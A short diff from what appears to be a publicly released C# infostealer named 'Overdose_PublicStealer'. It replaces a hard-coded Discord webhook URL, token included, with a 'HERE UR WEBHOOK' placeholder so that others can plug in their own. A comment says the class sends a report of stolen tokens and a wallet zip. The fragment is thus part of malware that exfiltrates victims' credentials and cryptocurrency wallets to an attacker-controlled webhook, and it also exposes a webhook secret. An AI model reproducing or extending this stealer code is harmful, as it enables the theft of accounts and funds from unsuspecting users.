@@ -13,7 +13,7 @@ namespace Overdose_PublicStealer
     internal static class WebhookSender
     {
         // Webhook URL where data will be sent. Make sure to replace this with your own webhook URL.
-        private static readonly string webhookUrl = "https://discord.com/api/webhooks/1352301552697868339/iwfmrSlDggh3E9UU6NtHZzE0MpiqQRyEHV-noZfTutRfOjO33okDv_ZkcpfHc3bWWA4h";
+        private static readonly string webhookUrl = "HERE UR WEBHOOK";
 
         /// <summary>
         /// Sends a combined report including stolen tokens, wallet zip
